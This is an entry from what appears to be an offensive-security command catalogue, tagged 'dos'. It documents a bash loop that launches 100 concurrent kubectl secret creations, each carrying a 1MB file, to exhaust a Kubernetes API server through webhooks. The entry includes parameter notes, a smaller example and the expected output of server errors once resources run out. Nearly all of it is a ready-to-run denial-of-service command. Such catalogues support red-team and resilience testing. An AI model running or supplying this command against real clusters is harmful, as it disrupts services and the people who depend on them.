---
id: cmd-for-loop-secrets-001
data: >-
  for i in $(seq 1 100); do k create secret generic test-b$i
  --from-file=lorem-1MB & done
tags:
  - dos
  - concurrent
type: command
output: |-
  secret/test-b1 created
  secret/test-b2 created
  ... (later) Error from server (InternalError): internal server error
executor: bash
platforms:
  - Linux
  - Kubernetes
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:01.385Z'
verified: false
validated: true
submitted: true
---
# for-loop-create-concurrent-secrets

## Command

```bash
for i in $(seq 1 100); do k create secret generic test-b$i --from-file=lorem-1MB & done
```

## Description

Loops to create 100 concurrent generic secrets from a 1MB file using background processes, triggering DoS via webhooks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `seq 1 100` | Sequence for naming | Yes |
| `test-b$i` | Secret name template | Yes |
| `--from-file=lorem-1MB` | Source file | Yes |
| `&` | Background execution | Yes |

## Examples

### Basic Usage

```bash
for i in $(seq 1 10); do kubectl create secret generic test$i --from-file=data.txt & done
```

### Advanced Usage

Full command for 100 iterations.

## Expected Output

Initial successes followed by server errors as resources exhaust.

## Related

- [[Related Procedure: Trigger-DoS-with-Concurrent-Secret-Creations]]
